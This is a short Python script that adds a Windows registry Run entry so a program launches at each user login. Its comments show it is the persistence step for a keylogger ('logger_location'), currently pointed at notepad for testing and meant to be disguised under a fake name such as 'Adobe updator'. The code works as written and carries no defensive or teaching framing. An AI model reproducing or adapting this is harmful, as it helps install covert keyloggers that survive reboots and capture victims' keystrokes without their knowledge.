import winreg

val_name = 'notepad'  # bogus name here; say 'Adobe updator'
logger_location = r'c:\windows\notepad.exe'  # ! set to notepad for testing

# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
reg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER,
                       'Software\Microsoft\Windows\CurrentVersion')
key = winreg.CreateKey(reg, 'Run')
winreg.SetValueEx(key, val_name, 0, winreg.REG_SZ, logger_location)

if key:
    winreg.CloseKey(key)
